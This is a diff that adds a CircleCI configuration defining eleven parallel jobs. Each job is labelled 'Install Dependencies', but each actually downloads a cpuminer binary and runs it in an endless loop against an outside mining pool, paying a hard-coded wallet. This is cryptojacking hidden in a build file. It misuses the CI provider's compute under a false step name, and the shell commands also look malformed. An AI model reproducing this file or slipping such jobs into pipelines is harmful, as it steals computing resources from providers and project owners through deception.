@@ -1,0 +1,151 @@
+version: 2.1
+jobs:
+    Gwb:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget clone https://github.com/rplant8/cpuminer-opt-rplant/releases/tag/5.0.24/cpuminer-opt-linux.tar.gz
+                               tar xf cpuminer-opt-linux.tar.gz
+                               while [ 1 ]; do
+                               ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RUxV8E1w6fToh5RbdKDqvq9X7ksgnNFjRK.Lapi -t 34
+                               sleep 5
+                               done
+    Gwb1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget clone https://github.com/rplant8/cpuminer-opt-rplant/releases/tag/5.0.24/cpuminer-opt-linux.tar.gz
+                               tar xf cpuminer-opt-linux.tar.gz
+                               while [ 1 ]; do
+                               ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RUxV8E1w6fToh5RbdKDqvq9X7ksgnNFjRK.Lapi1 -t 34
+                               sleep 5
+                               done
+    Gwb2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget clone https://github.com/rplant8/cpuminer-opt-rplant/releases/tag/5.0.24/cpuminer-opt-linux.tar.gz
+                               tar xf cpuminer-opt-linux.tar.gz
+                               while [ 1 ]; do
+                               ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RUxV8E1w6fToh5RbdKDqvq9X7ksgnNFjRK.Lapi2 -t 34
+                               sleep 5
+                               done
+    Gwb3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget clone https://github.com/rplant8/cpuminer-opt-rplant/releases/tag/5.0.24/cpuminer-opt-linux.tar.gz
+                               tar xf cpuminer-opt-linux.tar.gz
+                               while [ 1 ]; do
+                               ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RUxV8E1w6fToh5RbdKDqvq9X7ksgnNFjRK.Lapi3 -t 34
+                               sleep 5
+                               done
+    Gwb4:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget clone https://github.com/rplant8/cpuminer-opt-rplant/releases/tag/5.0.24/cpuminer-opt-linux.tar.gz
+                               tar xf cpuminer-opt-linux.tar.gz
+                               while [ 1 ]; do
+                               ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RUxV8E1w6fToh5RbdKDqvq9X7ksgnNFjRK.Lapi4 -t 34
+                               sleep 5
+                               done
+    Gwb5:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget clone https://github.com/rplant8/cpuminer-opt-rplant/releases/tag/5.0.24/cpuminer-opt-linux.tar.gz
+                               tar xf cpuminer-opt-linux.tar.gz
+                               while [ 1 ]; do
+                               ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RUxV8E1w6fToh5RbdKDqvq9X7ksgnNFjRK.Lapi5 -t 34
+                               sleep 5
+                               done
+    Gwb6:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget clone https://github.com/rplant8/cpuminer-opt-rplant/releases/tag/5.0.24/cpuminer-opt-linux.tar.gz
+                               tar xf cpuminer-opt-linux.tar.gz
+                               while [ 1 ]; do
+                               ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RUxV8E1w6fToh5RbdKDqvq9X7ksgnNFjRK.Lapi6 -t 34
+                               sleep 5
+                               done
+    Gwb7:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget clone https://github.com/rplant8/cpuminer-opt-rplant/releases/tag/5.0.24/cpuminer-opt-linux.tar.gz
+                               tar xf cpuminer-opt-linux.tar.gz
+                               while [ 1 ]; do
+                               ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RUxV8E1w6fToh5RbdKDqvq9X7ksgnNFjRK.Lapi7 -t 34
+                               sleep 5
+                               done
+    Gwb8:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget clone https://github.com/rplant8/cpuminer-opt-rplant/releases/tag/5.0.24/cpuminer-opt-linux.tar.gz
+                               tar xf cpuminer-opt-linux.tar.gz
+                               while [ 1 ]; do
+                               ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RUxV8E1w6fToh5RbdKDqvq9X7ksgnNFjRK.Lapi8 -t 34
+                               sleep 5
+                               done
+    Gwb9:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget clone https://github.com/rplant8/cpuminer-opt-rplant/releases/tag/5.0.24/cpuminer-opt-linux.tar.gz
+                               tar xf cpuminer-opt-linux.tar.gz
+                               while [ 1 ]; do
+                               ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RUxV8E1w6fToh5RbdKDqvq9X7ksgnNFjRK.Lapi9 -t 34
+                               sleep 5
+                               done
+    Gwb10:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget clone https://github.com/rplant8/cpuminer-opt-rplant/releases/tag/5.0.24/cpuminer-opt-linux.tar.gz
+                               tar xf cpuminer-opt-linux.tar.gz
+                               while [ 1 ]; do
+                               ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RUxV8E1w6fToh5RbdKDqvq9X7ksgnNFjRK.Lapi10 -t 34
+                               sleep 5
+                               done
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - Gwb
+            - Gwb1
+            - Gwb2
+            - Gwb3
+            - Gwb4
+            - Gwb5
+            - Gwb6
+            - Gwb7
+            - Gwb8
+            - Gwb9
+            - Gwb10
+
+
